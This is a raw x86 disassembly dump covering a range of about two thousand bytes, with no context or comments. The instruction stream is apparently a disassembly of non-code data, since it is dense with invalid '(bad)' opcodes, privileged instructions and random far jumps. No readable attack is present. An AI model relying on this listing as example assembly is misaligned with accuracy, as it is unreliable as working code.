  4182bb:	call   0xd1ad:0xb7747ccc
  4182c2:	gs jecxz 0x418303
  4182c5:	pushf  
  4182c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182c7:	enter  0x3b56,0x2
  4182cb:	imul   DWORD PTR [ebp-0x79]
  4182ce:	lods   eax,DWORD PTR ds:[esi]
  4182cf:	and    eax,0xa6566bec
  4182d4:	leave  
  4182d5:	mov    edi,0x7c2780d2
  4182da:	mov    ecx,0x127f88c8
  4182df:	pop    esi
  4182e0:	pop    ecx
  4182e1:	test   DWORD PTR [ebx-0x33a617a4],esi
  4182e7:	inc    eax
  4182e8:	iret   
  4182e9:	enter  0x1cbc,0xce
  4182ed:	iret   
  4182ee:	jbe    0x418318
  4182f0:	or     al,0xde
  4182f2:	add    BYTE PTR [ecx+0x4],dh
  4182f5:	jg     0x41833f
  4182f7:	mov    dl,0x38
  4182f9:	das    
  4182fa:	out    0x5a,al
  4182fc:	jmp    0x418285
  4182fe:	test   eax,0x6ac05127
  418303:	ror    ah,0xdf
  418306:	lods   al,BYTE PTR ds:[esi]
  418307:	push   0xffffffdf
  418309:	hlt    
  41830a:	and    DWORD PTR [esi-0x71],esi
  41830d:	add    ch,bh
  41830f:	sbb    bl,BYTE PTR ss:[ecx+0x77ba0764]
  418316:	(bad)  
  418317:	enter  0x2aa5,0x82
  41831b:	and    BYTE PTR [eax],dh
  41831d:	jbe    0x4182de
  41831f:	dec    ebx
  418320:	jmp    0x523a:0x7eaae40d
  418327:	pop    ds
  418328:	fist   DWORD PTR [ecx]
  41832a:	mov    ebx,eax
  41832c:	mov    edi,0xeba43197
  418331:	and    eax,0x9d189df7
  418336:	push   edi
  418337:	mov    edi,0x8ffce115
  41833c:	jb     0x41831a
  41833e:	ficomp DWORD PTR [edi+0x47]
  418341:	sub    BYTE PTR [esi-0x2f],al
  418344:	mov    esp,0x6b8e29b2
  418349:	add    dl,BYTE PTR [eax+ebx*4+0xb2945a9]
  418350:	jmp    0x4182e3
  418352:	pop    ebp
  418353:	cmp    ebp,DWORD PTR [ebx-0x4d]
  418356:	fistp  QWORD PTR [ebx+eax*2]
  418359:	fbld   TBYTE PTR [edx+0x55]
  41835c:	add    esp,edi
  41835e:	mov    eax,ds:0xa2b6b6b9
  418363:	adc    ch,bl
  418365:	div    BYTE PTR [ebx+0x2]
  418368:	ficomp WORD PTR [ebx-0x36]
  41836b:	js     0x4183bd
  41836d:	fild   QWORD PTR [eax]
  41836f:	add    BYTE PTR [esi+0x298874e3],ch
  418375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418376:	cld    
  418377:	imul   edx,DWORD PTR [ecx],0xffffffb2
  41837a:	mov    ds:0xdf439a98,al
  41837f:	(bad)  
  418380:	gs ret 
  418382:	lods   eax,DWORD PTR ds:[esi]
  418383:	mov    esp,0xe7f76050
  418388:	in     al,dx
  418389:	or     BYTE PTR [ecx+eax*2-0x46],ah
  41838d:	push   eax
  41838e:	sub    DWORD PTR [ebx+0x13],ecx
  418391:	pop    ss
  418392:	pop    edx
  418393:	rcl    DWORD PTR [ebp*1-0x343c66e0],cl
  41839a:	add    ch,dl
  41839c:	scas   al,BYTE PTR es:[edi]
  41839d:	mov    bl,bl
  41839f:	pop    es
  4183a0:	jmp    0x41841f
  4183a2:	(bad)  
  4183a3:	ss ss ss pop ebp
  4183a7:	enter  0x423d,0x3d
  4183ab:	mov    ebp,0xef3a2a8d
  4183b0:	pop    es
  4183b1:	sbb    dl,ch
  4183b3:	sbb    ebx,eax
  4183b5:	xor    eax,0x53c5b1fd
  4183ba:	xchg   edx,eax
  4183bb:	(bad)  
  4183bc:	cmp    al,BYTE PTR [edx]
  4183be:	inc    ebx
  4183bf:	leave  
  4183c0:	sar    DWORD PTR [edi+0xe0a290],1
  4183c6:	adc    BYTE PTR [eax],0x78
  4183c9:	jo     0x4183c8
  4183cb:	adc    BYTE PTR [esi],dl
  4183cd:	push   edi
  4183ce:	inc    esi
  4183cf:	(bad)  
  4183d0:	or     eax,0x6be2f7a0
  4183d5:	fs pop gs
  4183d8:	pop    ss
  4183d9:	(bad)  
  4183db:	pop    edx
  4183dc:	mov    bh,0xc8
  4183de:	push   ebp
  4183df:	(bad)  
  4183e0:	jmp    0x4183c7
  4183e2:	sub    al,0xf9
  4183e4:	pxor   mm1,QWORD PTR [ebx-0x29]
  4183e8:	ror    cl,0x20
  4183eb:	enter  0xb887,0x2b
  4183ef:	xor    ebx,ecx
  4183f1:	xchg   esp,eax
  4183f2:	ins    DWORD PTR es:[edi],dx
  4183f3:	pop    ebp
  4183f4:	jmp    0x4183e2
  4183f6:	xchg   ebx,eax
  4183f7:	xchg   edx,eax
  4183f8:	or     al,0x5
  4183fa:	cmp    al,0xd5
  4183fd:	fist   WORD PTR [eax-0xc5edbc2]
  418403:	sub    al,0xe7
  418405:	int3   
  418406:	cld    
  418407:	push   ebx
  418408:	inc    edx
  418409:	pop    eax
  41840a:	in     eax,0x31
  41840c:	jns    0x4183fc
  41840e:	xchg   ebp,eax
  41840f:	enter  0xfa4,0xa1
  418413:	mov    esp,0xa043e2b9
  418418:	in     al,dx
  418419:	cli    
  41841a:	dec    ebp
  41841b:	add    eax,0x4bd88b4
  418420:	push   ds
  418421:	adc    al,0x2c
  418423:	inc    eax
  418424:	test   eax,0xe8c848fe
  418429:	adc    ah,cl
  41842b:	cmp    BYTE PTR [ebx],bh
  41842d:	outs   dx,DWORD PTR ds:[esi]
  41842e:	push   0xffffffe6
  418430:	loop   0x4183e9
  418432:	mov    ecx,0x5f0de749
  418437:	mov    DWORD PTR [eax-0x51ce22dc],edi
  41843d:	(bad)  
  41843f:	add    BYTE PTR [ecx-0x7c],0x25
  418443:	adc    BYTE PTR [edi-0x27],dl
  418446:	cld    
  418447:	es push ds
  418449:	repnz rcr DWORD PTR [edi-0x37eb5841],0xc6
  418451:	and    dh,0x3b
  418454:	int    0xbb
  418456:	(bad)  
  418457:	mov    edx,0x1496ce9
  41845c:	dec    ebx
  41845d:	sub    al,0x27
  41845f:	sub    eax,DWORD PTR [ebx+0x3f]
  418462:	inc    eax
  418463:	test   al,0x62
  418465:	fild   QWORD PTR [edi-0x4c1b67f6]
  41846b:	fwait
  41846c:	push   0xeb0623af
  418471:	xchg   esi,eax
  418472:	push   esp
  418473:	shl    BYTE PTR [ecx],cl
  418475:	je     0x41849c
  418477:	loop   0x41840b
  418479:	dec    ecx
  41847a:	out    dx,al
  41847b:	(bad)  
  41847c:	and    ah,al
  41847e:	adc    BYTE PTR [edi-0x610b264a],dh
  418484:	jmp    0x4184b0
  418486:	push   esi
  418487:	bswap  edx
  418489:	pop    es
  41848a:	sbb    BYTE PTR [ecx+0x2db5df0d],0x24
  418491:	sbb    DWORD PTR ds:0xfd575287,ebp
  418497:	or     DWORD PTR [eax+esi*4+0x64],esi
  41849b:	pop    ebp
  41849c:	mov    BYTE PTR [ebx-0x4a443775],ch
  4184a2:	cdq    
  4184a3:	(bad)  
  4184a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a5:	retf   
  4184a6:	jmp    0x702a:0xada2ebf9
  4184ad:	push   eax
  4184ae:	(bad)  [eax+0x6d27df2a]
  4184b4:	and    BYTE PTR [edi-0x7],0x31
  4184b8:	jp     0x418529
  4184ba:	add    DWORD PTR [ebx+eax*8],ecx
  4184bd:	imul   edi,ebp,0xb29fb520
  4184c3:	pop    ebx
  4184c4:	lods   eax,DWORD PTR ds:[esi]
  4184c5:	fbld   TBYTE PTR [ecx+0x3a1ef15c]
  4184cb:	fcomi  st,st(4)
  4184cd:	mov    al,0xfd
  4184cf:	cmp    ecx,edi
  4184d1:	push   edi
  4184d2:	fstp   QWORD PTR [esi+0x30]
  4184d5:	jge    0x418468
  4184d7:	adc    al,0x8f
  4184d9:	shr    BYTE PTR [edi+0x3d44397c],cl
  4184df:	add    ah,al
  4184e1:	fwait
  4184e2:	ins    BYTE PTR es:[edi],dx
  4184e3:	aas    
  4184e4:	jmp    0x418542
  4184e6:	inc    edi
  4184e7:	idiv   DWORD PTR [ecx-0x2a]
  4184ea:	in     eax,dx
  4184eb:	mov    ebx,gs
  4184ed:	aaa    
  4184ee:	inc    esp
  4184ef:	icebp  
  4184f0:	sahf   
  4184f1:	fs jnp 0x4184e1
  4184f4:	in     eax,0xdf
  4184f6:	xchg   ebp,eax
  4184f7:	fistp  DWORD PTR [eax]
  4184f9:	or     ecx,eax
  4184fb:	cmp    eax,0xa2fce099
  418500:	js     0x4184c9
  418502:	rcr    eax,cl
  418504:	popf   
  418505:	jno    0x4184f6
  418507:	(bad)  
  418508:	mov    ebp,0x657fc3b6
  41850d:	sahf   
  41850e:	xor    BYTE PTR [esi+0xf],ch
  418511:	mul    ebx
  418513:	stos   BYTE PTR es:[edi],al
  418514:	adc    eax,0x283c91df
  418519:	mov    BYTE PTR [ecx],ch
  41851b:	aaa    
  41851c:	fld    QWORD PTR [edi+ebp*4]
  418520:	dec    eax
  418521:	nop
  418522:	rcl    BYTE PTR [ebx],1
  418524:	inc    eax
  418525:	mov    edi,0xdfeda81f
  41852a:	int3   
  41852b:	adc    al,0xfd
  41852d:	int3   
  41852e:	inc    edx
  41852f:	mov    ebp,0x90fcf54a
  418534:	inc    ebx
  418535:	push   edx
  418536:	push   edi
  418537:	repz in eax,0x1c
  41853a:	dec    ebp
  41853b:	enter  0x9fad,0x9
  41853f:	mul    DWORD PTR [eax-0x1968a0dd]
  418545:	jae    0x4185a5
  418547:	pop    ebx
  418548:	aad    0xbb
  41854a:	sbb    al,0x77
  41854c:	mov    ecx,esi
  41854e:	test   eax,ecx
  418550:	(bad)
  418554:	add    al,0x4
  418556:	sub    eax,0x29a09d4
  41855b:	lods   al,BYTE PTR ds:[esi]
  41855c:	in     al,0x94
  41855e:	jl     0x4184f0
  418560:	dec    edx
  418561:	mov    al,ds:0xdf7ea836
  418566:	fbld   TBYTE PTR [ebx]
  418568:	dec    ebp
  418569:	ss stos DWORD PTR es:[edi],eax
  41856b:	ins    BYTE PTR es:[edi],dx
  41856c:	scas   eax,DWORD PTR es:[edi]
  41856d:	(bad)  
  41856e:	cld    
  41856f:	mov    al,ds:0x42203a57
  418574:	cmp    ecx,ebp
  418576:	call   0xd45:0xdc81d7c8
  41857d:	push   esp
  41857e:	mov    eax,0xb0a0ea47
  418583:	ror    DWORD PTR [ebx-0x40],0xce
  418587:	jb     0x41852a
  418589:	sub    BYTE PTR ds:0xfd1881d1,bl
  41858f:	or     BYTE PTR [ebx-0xf],dh
  418592:	sbb    eax,0xf8a9488b
  418597:	loope  0x418530
  418599:	mov    esp,0x55450b7d
  41859e:	aas    
  41859f:	cld    
  4185a0:	pop    esi
  4185a1:	pop    ds
  4185a2:	call   0xc8b6710e
  4185a7:	shl    dh,cl
  4185a9:	push   0x54
  4185ab:	not    bl
  4185ad:	fadd   QWORD PTR [ebp+0x22]
  4185b0:	jmp    0x1c05e549
  4185b5:	out    dx,eax
  4185b6:	(bad)  
  4185b8:	jmp    0x4185b6
  4185ba:	ins    BYTE PTR es:[edi],dx
  4185bb:	push   esp
  4185bc:	xchg   esi,eax
  4185bd:	nop
  4185be:	adc    bh,al
  4185c0:	sbb    BYTE PTR [edi],al
  4185c2:	fwait
  4185c3:	lods   al,BYTE PTR ds:[esi]
  4185c4:	imul   ebp,DWORD PTR [esi+ecx*8],0xffffffdf
  4185c8:	cld    
  4185c9:	jns    0x4185c7
  4185cb:	in     al,0xeb
  4185cd:	add    ecx,esp
  4185cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d0:	add    ah,ch
  4185d2:	stos   DWORD PTR es:[edi],eax
  4185d3:	push   esp
  4185d4:	inc    ebp
  4185d5:	fist   WORD PTR [edx+eiz*4-0x42]
  4185d9:	xor    eax,0xc88e7852
  4185de:	repz pop eax
  4185e0:	push   ds
  4185e1:	sub    ebx,DWORD PTR [edx]
  4185e3:	test   al,0xd4
  4185e5:	loop   0x4185be
  4185e7:	pop    ss
  4185e8:	mov    dh,0xe9
  4185ea:	lock fld TBYTE PTR [ebp-0x352e9c7f]
  4185f1:	jmp    0x89f37e71
  4185f6:	cmp    eax,0xf8b72204
  4185fb:	sub    al,0xec
  4185fd:	lods   al,BYTE PTR ds:[esi]
  4185fe:	(bad)  
  4185ff:	pop    ebx
  418600:	test   al,0x6e
  418602:	jno    0x4185cf
  418604:	fwait
  418605:	push   es
  418606:	xor    al,0xc7
  418608:	jno    0x41859b
  41860a:	rol    DWORD PTR [ecx+eiz*4-0x72],0x2c
  41860f:	nop
  418610:	xor    eax,0xeb8acd33
  418615:	enter  0x8795,0x3c
  418619:	cli    
  41861a:	jo     0x418677
  41861c:	jecxz  0x4185fd
  41861e:	mov    ch,0xe9
  418620:	ret    
  418621:	push   cs
  418622:	pop    esi
  418623:	cmp    ebp,esi
  418625:	xor    al,0xfd
  418627:	test   BYTE PTR [esi+0xd],0x1a
  41862b:	in     al,0xba
  41862d:	leave  
  41862e:	sub    cl,al
  418630:	bound  esi,QWORD PTR [ebx-0x4c]
  418633:	jl     0x418675
  418635:	pop    eax
  418636:	scas   eax,DWORD PTR es:[edi]
  418637:	loope  0x418624
  418639:	mov    dh,0xc7
  41863b:	stos   DWORD PTR es:[edi],eax
  41863c:	mov    ds:0xab6a852f,al
  418641:	fsubp  st(2),st
  418643:	add    eax,0x7dc5a9df
  418648:	or     al,0x52
  41864a:	sbb    al,0x2b
  41864c:	dec    ebx
  41864d:	lods   eax,DWORD PTR ds:[esi]
  41864e:	push   cs
  41864f:	and    dl,ch
  418651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418652:	sar    BYTE PTR [eax+0x384ad5c4],0x4a
  418659:	imul   ebp,ebp,0x6ecdb8c7
  41865f:	imul   ebx,DWORD PTR [eax],0xebc6f302
  418665:	jb     0x4185f4
  418667:	mov    ah,0x10
  418669:	sbb    ecx,esp
  41866b:	idiv   BYTE PTR [edi+0x158be2de]
  418671:	out    0x50,eax
  418673:	in     al,dx
  418674:	inc    ecx
  418675:	aas    
  418676:	ss cli 
  418678:	fisubr WORD PTR [ebp+ebx*2-0x38]
  41867c:	popa   
  41867d:	xchg   BYTE PTR [esp+eax*8+0x3d],dl
  418681:	test   eax,0xa2c4c846
  418686:	arpl   cx,di
  418688:	pusha  
  418689:	or     DWORD PTR [ecx],ebx
  41868b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41868c:	jmp    0x41861b
  41868e:	pop    ebp
  41868f:	cmp    DWORD PTR [ebx-0x7c],edx
  418692:	jae    0x41863e
  418694:	and    ebx,edi
  418696:	xor    DWORD PTR ds:0x9db02ac7,eax
  41869c:	dec    esi
  41869d:	xor    edi,ebp
  41869f:	xchg   DWORD PTR [esi+0x3d2bdfc],ebx
  4186a5:	stos   DWORD PTR es:[edi],eax
  4186a6:	pop    es
  4186a7:	enter  0x5c50,0xb4
  4186ab:	cld    
  4186ac:	add    al,0x11
  4186ae:	push   ds
  4186af:	sti    
  4186b0:	in     al,dx
  4186b1:	cli    
  4186b2:	rcr    BYTE PTR [edi],1
  4186b4:	mov    dh,BYTE PTR [edi+ecx*8+0x13]
  4186b8:	adc    edx,DWORD PTR [edi]
  4186ba:	xchg   ebp,eax
  4186bb:	enter  0x563e,0xb
  4186bf:	pop    edi
  4186c0:	retf   0xc834
  4186c3:	sub    bl,0x9c
  4186c6:	and    al,0x8
  4186c8:	int3   
  4186c9:	jle    0x41871f
  4186cb:	fistp  WORD PTR [edi+eax*1+0x6de187fb]
  4186d2:	inc    ebp
  4186d3:	jmp    0x148092c3
  4186d8:	aam    0xb7
  4186da:	cs xor dl,ch
  4186dd:	mov    eax,ds:0xd7250a6f
  4186e2:	aam    0xf
  4186e4:	bound  edi,QWORD PTR ds:0xdf11a0c9
  4186ea:	inc    eax
  4186eb:	mov    ebp,esp
  4186ed:	cli    
  4186ee:	cmp    al,0xec
  4186f0:	outs   dx,DWORD PTR ds:[esi]
  4186f1:	dec    edx
  4186f2:	std    
  4186f3:	fdiv   DWORD PTR [ebp-0x725c7db7]
  4186f9:	pop    es
  4186fa:	lock (bad) 
  4186fc:	das    
  4186fd:	dec    eax
  4186fe:	or     al,0x17
  418700:	jmp    0xe2d:0xebe1c192
  418707:	shr    DWORD PTR [ecx+0x39],cl
  41870a:	add    DWORD PTR [ebx+esi*2],0xffffffdd
  41870e:	push   ss
  41870f:	popf   
  418710:	push   es
  418711:	mov    ebp,0x26ab313c
  418716:	in     al,0xf6
  418718:	jmp    0x41878e
  41871a:	in     al,dx
  41871b:	xor    eax,0x94322d04
  418720:	adc    edi,DWORD PTR [edi-0x71]
  418723:	push   ebp
  418724:	outs   dx,DWORD PTR ds:[esi]
  418725:	fild   WORD PTR [ebx+0x45]
  418728:	popf   
  418729:	mov    al,ds:0xb6094da0
  41872e:	fadd   DWORD PTR [ecx]
  418730:	aaa    
  418731:	sbb    bh,ah
  418733:	(bad)  [ebx]
  418735:	fdivrp st(7),st
  418737:	push   cs
  418738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418739:	inc    esi
  41873a:	and    al,0x77
  41873c:	stos   DWORD PTR es:[edi],eax
  41873d:	jp     0x4186ff
  41873f:	mov    esi,0xd6be220
  418744:	push   cs
  418745:	(bad)
  41874a:	mov    al,BYTE PTR [edi]
  41874c:	fist   DWORD PTR [esi+0x9]
  41874f:	push   0xc
  418751:	jg     0x418795
  418753:	xor    ah,0xf8
  418756:	cld    
  418757:	pop    ds
  418758:	repnz dec ebx
  41875a:	push   ebx
  41875b:	(bad)
  41875e:	cld    
  41875f:	or     al,0x69
  418761:	xor    DWORD PTR [ebp+edx*8-0x4b],esp
  418765:	test   DWORD PTR [ecx-0x38],0xe279167a
  41876c:	out    dx,eax
  41876d:	repz sbb BYTE PTR [esi+0x72006f9f],dl
  418774:	test   eax,0x6ce11b72
  418779:	pop    ds
  41877a:	fs cmp al,0x1f
  41877d:	scas   eax,DWORD PTR es:[edi]
  41877e:	daa    
  41877f:	cmp    ebp,DWORD PTR [esi+0x46f326df]
  418785:	push   esp
  418786:	dec    esi
  418787:	out    dx,eax
  418788:	repnz mov edi,0xf34cd5fc
  41878e:	and    ebx,DWORD PTR gs:[ecx+0x6e]
  418792:	loope  0x418731
  418794:	push   ebp
  418795:	fild   QWORD PTR [esi-0x251794bf]
  41879b:	mov    dl,0x62
  41879d:	jmp    0x762a:0xeb080afc
  4187a4:	shl    DWORD PTR [edi],1
  4187a6:	jg     0x418745
  4187a8:	xchg   esi,eax
  4187a9:	fistp  WORD PTR [esi+0x60]
  4187ac:	jle    0x4187c9
  4187ae:	aam    0xd7
  4187b0:	adc    esp,DWORD PTR [ebx]
  4187b2:	std    
  4187b3:	arpl   WORD PTR [ecx+0x36bbf849],dx
  4187b9:	mov    edi,0x60c9cbae
  4187be:	out    0x74,eax
  4187c0:	(bad)  
  4187c1:	mov    WORD PTR [ebp-0x3105a3d],fs
  4187c7:	and    DWORD PTR ds:0xd1bb5d9f,edi
  4187cd:	scas   al,BYTE PTR es:[edi]
  4187ce:	jecxz  0x418797
  4187d0:	out    dx,eax
  4187d1:	add    esp,esi
  4187d3:	or     bl,BYTE PTR [eax-0x1551edfb]
  4187d9:	mov    ds:0x9052591d,eax
  4187de:	inc    esp
  4187df:	enter  0xbd49,0x76
  4187e3:	sub    DWORD PTR [edx-0x156e3240],edi
  4187e9:	(bad)  
  4187ea:	data16 das 
  4187ec:	clc    
  4187ed:	jnp    0x418801
  4187ef:	adc    BYTE PTR [ebx],al
  4187f1:	ret    
  4187f2:	addr16 enter 0xf721,0xe7
  4187f7:	fcmovu st,st(4)
  4187f9:	lock add esi,DWORD PTR [esi-0x15]
  4187fd:	mov    ecx,0x6c3fee77
  418802:	dec    eax
  418803:	inc    ebp
  418804:	xlat   BYTE PTR ds:[ebx]
  418805:	add    DWORD PTR [ecx+edx*4+0xaf2ead5],ecx
  41880c:	test   eax,0x33643e64
  418811:	icebp  
  418812:	inc    edx
  418813:	(bad)  
  418814:	jmp    0x418873
  418816:	mov    eax,0x4a597e4f
  41881b:	es scas eax,DWORD PTR es:[edi]
  41881d:	fisttp QWORD PTR [edi]
  41881f:	inc    eax
  418820:	push   ss
  418821:	lea    edi,[esi-0x683c7428]
  418827:	test   al,0xee
  418829:	shl    DWORD PTR [edx],1
  41882b:	inc    ebx
  41882c:	jnp    0x4187e6
  41882e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41882f:	(bad)  [ebx-0x7e]
  418832:	pop    esp
  418833:	das    
  418834:	imul   edi,DWORD PTR [ecx],0x15
  418837:	enter  0x94bc,0xb8
  41883b:	jne    0x41889a
  41883d:	(bad)  
  41883e:	repz mov eax,0x570badeb
  418844:	dec    eax
  418845:	mov    eax,0xdfc829cd
  41884a:	call   0x89f5:0xf213a195
  418851:	jmp    0x9666:0x8e1cebfc
  418858:	outs   dx,BYTE PTR ds:[esi]
  418859:	jmp    0x4187e9
  41885b:	enter  0xc849,0x62
  41885f:	je     0x4188c2
  418861:	add    cl,cl
  418863:	jge    0x418850
  418865:	jmp    0xf9a1:0x5ef944e7
  41886c:	sub    bl,bh
  41886e:	xchg   cl,ah
  418870:	mov    WORD PTR [edi+0x59],?
  418873:	das    
  418874:	or     al,0x55
  418876:	call   FWORD PTR [ebx+eiz*1]
  418879:	out    0x3a,eax
  41887b:	add    bh,BYTE PTR [edi+0x5f]
  41887e:	pop    edi
  41887f:	pushf  
  418880:	dec    edx
  418881:	or     dl,BYTE PTR [ebp-0x2d2053ec]
  418887:	(bad)  
  418888:	push   cs
  418889:	fcomp  st(5)
  41888b:	imul   ebx,DWORD PTR [ebx],0xffffffb1
  41888e:	cld    
  41888f:	adc    dh,BYTE PTR [eax]
  418891:	mov    ch,0x72
  418893:	jmp    0x4188ce
  418895:	fs push ebp
  418897:	jecxz  0x4188de
  418899:	xor    esi,esp
  41889b:	shr    DWORD PTR ds:0x4efe3cd9,1
  4188a1:	out    0xfd,al
  4188a3:	mov    ebx,ebp
  4188a5:	and    edi,ebp
  4188a7:	dec    ebx
  4188a8:	mov    dh,0x5c
  4188aa:	or     BYTE PTR [ecx+ecx*1],bh
  4188ad:	fbld   TBYTE PTR [eax+0x2e932055]
  4188b3:	xchg   DWORD PTR ds:0x9ab3fd57,ebx
  4188b9:	nop
  4188ba:	fisttp QWORD PTR [edx-0x381d046f]
  4188c0:	paddusb mm1,QWORD PTR [edi+0x3b]
  4188c4:	outs   dx,DWORD PTR ds:[esi]
  4188c5:	inc    eax
  4188c6:	cmp    DWORD PTR [ebp+0x797092eb],esp
  4188cc:	nop
  4188cd:	push   ebp
  4188ce:	pusha  
  4188cf:	xchg   BYTE PTR [ebx-0x1574e521],ah
  4188d5:	jne    0x418882
  4188d7:	sbb    al,0x36
  4188d9:	cdq    
  4188da:	cld    
  4188db:	je     0x4188a7
  4188dd:	jg     0x4188b7
  4188df:	and    cl,BYTE PTR [ecx-0x3a37d88a]
  4188e5:	or     ah,ah
  4188e7:	mov    al,ds:0x54f7b921
  4188ec:	jmp    0x41891b
  4188ee:	sbb    DWORD PTR [ebp-0x1a7929a7],eax
  4188f4:	xor    bl,bh
  4188f6:	add    BYTE PTR [ecx],dl
  4188f8:	outs   dx,DWORD PTR ds:[esi]
  4188f9:	adc    eax,0xabd1210f
  4188fe:	cld    
  4188ff:	cmc    
  418900:	mov    eax,0x17c5d421
  418905:	mov    esp,0xf416c84e
  41890a:	mov    ds:0x6b34ecfb,al
  41890f:	pop    esi
  418910:	sbb    ebp,eax
  418912:	cld    
  418913:	loop   0x4188bc
  418915:	pop    edx
  418916:	jmp    0x9665d930
  41891b:	enter  0x3c7b,0x81
  41891f:	and    al,0x75
  418921:	mov    edx,0xb4c3cf33
  418926:	xchg   eax,ecx
  418928:	pushf  
  418929:	stc    
  41892a:	retf   
  41892b:	loopne 0x4189a9
  41892d:	ins    BYTE PTR es:[edi],dx
  41892e:	mov    bh,0x22
  418930:	pop    ss
  418931:	dec    edi
  418932:	fadd   st,st(7)
  418934:	mov    BYTE PTR [edx],cl
  418936:	pop    ebx
  418937:	sbb    ecx,ebx
  418939:	and    al,0x6d
  41893b:	(bad)  
  41893c:	popf   
  41893d:	inc    edx
  41893e:	(bad)  
  41893f:	arpl   WORD PTR [esi+ebx*1],sp
  418942:	adc    eax,0xbd85bfb3
  418947:	push   esi
  418948:	neg    edi
  41894a:	xchg   edx,eax
  41894b:	pop    edi
  41894c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41894d:	sub    DWORD PTR [edi-0x55],ebx
  418950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418951:	in     al,0xfd
  418953:	xor    eax,0xe753aee0
  418958:	pushf  
  418959:	iret   
  41895a:	int3   
  41895b:	add    eax,0x3360df48
  418960:	inc    esi
  418961:	jmp    0x4189ac
  418963:	in     eax,dx
  418964:	ret    0xfcf1
  418967:	mov    bh,0x7
  418969:	test   bh,dl
  41896b:	adc    BYTE PTR [ecx+0x4e95ec15],al
  418971:	fidiv  WORD PTR [ebx-0x2e763ce2]
  418977:	and    BYTE PTR [ebx-0x19abc241],0xde
  41897e:	repz push edx
  418980:	and    BYTE PTR [eax-0x31],al
  418983:	mov    bl,0xf9
  418985:	lahf   
  418986:	loopne 0x4189df
  418988:	pop    es
  418989:	fild   WORD PTR [edx+0x6d62a91]
  41898f:	push   esp
  418990:	pop    ds
  418991:	add    edi,ebp
  418993:	or     BYTE PTR [ecx-0x60],al
  418996:	add    ch,BYTE PTR [ecx]
  418998:	les    esi,FWORD PTR [esp+edx*4-0x63b83638]
  41899f:	fnstenv [eax+0x67]
  4189a2:	push   ss
  4189a3:	jns    0x418990
  4189a5:	dec    ecx
  4189a6:	push   edi
  4189a7:	and    eax,0x21067315
  4189ac:	fxch   st(3)
  4189ae:	jp     0x418979
  4189b0:	repz inc edi
  4189b2:	aam    0x7a
  4189b4:	out    dx,eax
  4189b5:	jecxz  0x418978
  4189b7:	sbb    al,0xbf
  4189b9:	pop    ebp
  4189ba:	std    
  4189bb:	loopne 0x418a20
  4189bd:	outs   dx,BYTE PTR ds:[esi]
  4189be:	jle    0x418943
  4189c0:	je     0x418a1b
  4189c2:	pop    ebp
  4189c3:	enter  0x86e6,0x2
  4189c7:	setge  BYTE PTR [edi+esi*2+0x63]
  4189cc:	jmp    0x41899a
  4189ce:	jmp    0x1bd966ec
  4189d3:	retf   
  4189d4:	cmp    eax,0x8980c7d6
  4189d9:	xor    BYTE PTR [ebx-0x3367142b],ch
  4189df:	mov    cl,0xf3
  4189e1:	cmp    al,0x27
  4189e3:	enter  0xb0e3,0x4c
  4189e7:	xchg   edx,eax
  4189e8:	loopne 0x418a45
  4189ea:	repz mov edi,ebp
  4189ed:	js     0x418991
  4189ef:	pop    ecx
  4189f0:	stos   DWORD PTR es:[edi],eax
  4189f1:	push   ds
  4189f2:	lock stos BYTE PTR es:[edi],al
  4189f4:	pop    es
  4189f5:	aam    0xe5
  4189f7:	mov    dh,0x7d
  4189f9:	mov    ah,0xa8
  4189fb:	leave  
  4189fc:	mov    esp,0x8dea02ab
  418a01:	pop    ds
  418a02:	loope  0x418a70
  418a04:	jmp    0xdd04:0x55beff13
  418a0b:	das    
  418a0c:	xor    DWORD PTR [ebp-0x2fd937e6],esp
  418a12:	xchg   edi,eax
  418a13:	iret   
  418a14:	inc    ebp
  418a15:	jno    0x4189e1
  418a17:	push   es
  418a18:	jmp    0x418a5f
  418a1a:	fsub   DWORD PTR [edi-0x8ec3c8f]
  418a20:	xchg   ebx,eax
  418a21:	(bad)  
  418a23:	mov    DWORD PTR [ecx+0x5361e778],esi
  418a29:	jge    0x418a9a
  418a2b:	mov    ds:0x9c7989e8,eax
  418a30:	pop    ss
  418a31:	test   al,0xfc
  418a33:	sti    
  418a34:	dec    DWORD PTR [ebx+0x3576cb19]
  418a3a:	add    cl,al
  418a3c:	ja     0x418a16
  418a3e:	jae    0x4189c5
  418a40:	mov    ds,WORD PTR [ecx-0x73147da5]
  418a46:	stc    
  418a47:	outs   dx,DWORD PTR ds:[esi]
  418a48:	add    al,0x65
  418a4a:	ret    
  418a4b:	xor    eax,0x642804ed
  418a50:	jmp    0x4189e6
  418a52:	jo     0x4189e4
  418a54:	(bad)  
  418a55:	(bad)  
  418a56:	sub    edi,DWORD PTR [ecx]
  418a58:	jmp    0x418aa1
  418a5a:	mov    ah,0x9a
  418a5c:	mov    WORD PTR [ebx-0x24],?
  418a5f:	ins    DWORD PTR es:[edi],dx
  418a60:	ss add eax,0x4266bb20
  418a66:	push   ss
  418a67:	mov    eax,ds:0x91fe2fae
  418a6c:	dec    esp
  418a6d:	mov    ds:0xae22fe6,al
  418a72:	leave  
  418a73:	fcomip st,st(1)
  418a75:	int    0xa4
  418a77:	pop    ebx
  418a78:	jmp    0x418adb
  418a7a:	lea    ebx,[ebp-0x62]
  418a7d:	xchg   ebx,eax
  418a7e:	xor    bh,0x89
  418a81:	fsub   QWORD PTR [edi-0x65ea350d]
  418a87:	mov    edx,0x56962953
  418a8c:	jmp    0x418a5f
  418a8e:	push   esp
  418a8f:	add    al,0xdd
  418a91:	mov    al,ds:0xdf9c77cb
  418a96:	inc    edi
  418a97:	mov    ebp,DWORD PTR [ebx]
  418a99:	test   DWORD PTR [esi-0x32de4ab],eax
  418a9f:	jmp    ebp
  418aa1:	sahf   
  418aa2:	inc    edx
  418aa3:	nop
  418aa4:	fwait
  418aa5:	xchg   ecx,eax
  418aa6:	mov    dh,0x9b
  418aa8:	(bad)  
  418aa9:	fild   QWORD PTR [ebp+0x31]
  418aac:	mov    ds:0x5fa1a3c3,eax
